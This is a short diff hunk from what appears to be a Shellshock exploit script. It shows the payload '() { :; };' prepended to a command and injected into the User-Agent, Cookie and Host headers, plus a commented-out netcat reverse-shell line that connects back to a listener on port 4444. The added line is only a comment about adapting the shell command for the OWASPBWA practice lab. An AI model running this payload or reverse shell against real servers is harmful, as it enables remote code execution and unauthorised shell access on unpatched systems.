@@ -71,6 +71,7 @@ def getStatus(ourl):
 
     Command = "/bin/ping -c1 " + LISTENER
     #Command = "/bin/nc " + LISTENER + " 4444 -e /bin/bash" #uncomment this line if you want to spawn a reverse netcat shell
+    #If testing against OWASPBWA, change nc to nc.traditional.  Thanks  Charley aka dotslashpwn 
     USER_AGENT = "() { :; }; " + Command
     Cookie = "() { :; }; " + Command
     Host = "() { :; }; " + Command
